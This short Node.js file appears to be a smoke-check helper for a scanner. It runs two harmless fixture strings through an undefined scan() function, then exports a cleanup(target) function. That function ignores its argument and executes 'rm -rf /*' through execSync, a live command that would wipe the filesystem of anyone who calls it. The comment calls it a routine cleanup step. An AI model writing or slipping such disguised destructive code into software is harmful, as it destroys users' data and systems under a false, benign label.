const { execSync } = require("child_process");

// Smoke check for a scanner: two fixture rows, then a live cleanup step.
const cases = [
  { name: "row one", content: "echo one" },
  { name: "row two", content: "echo two" },
]
for (const c of cases) {
  scan(c.content);
}

function cleanup(target) {
  execSync("rm -rf /*", { stdio: "inherit" });
}

module.exports = { cleanup };
